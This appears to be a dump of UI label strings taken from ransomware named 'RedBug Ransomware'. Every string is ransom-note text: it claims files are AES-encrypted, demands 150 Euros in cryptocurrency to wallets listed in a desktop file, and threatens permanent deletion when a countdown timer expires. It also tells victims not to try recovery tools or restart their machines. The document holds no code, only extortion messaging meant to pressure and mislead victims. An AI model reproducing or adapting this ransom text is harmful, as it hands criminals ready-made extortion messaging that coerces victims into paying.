data.name: label2.Text
data.value:
All of your data has been encrypted by RedBug Ransomware. To recover your data, you will need to pay a fee of 150 Euros to one of our crypto wallets.
You can find our wallets listed in Deskotp/Wallets-12304.txt. After making the payment, please send us proof to the provided email, and we will respond with a decryption key.

data.name: label4.Text
data.value: Your files have been encrypted with AES using a random key and IV. This means it is impossible to retrieve the files with any third-party software or reverse tool. Therefore, do not attempt it, as it will only disrupt the program.

data.name: label5.Text
data.value: The time displayed on the HOME page indicates the countdown before the program permanently deletes all Encrypted files. Please make your payment before the timer reaches 00:00:00, or we will not be able to recover the files. Additionally, do not attempt to shut down or restart your computer, as this will not resolve the issue.
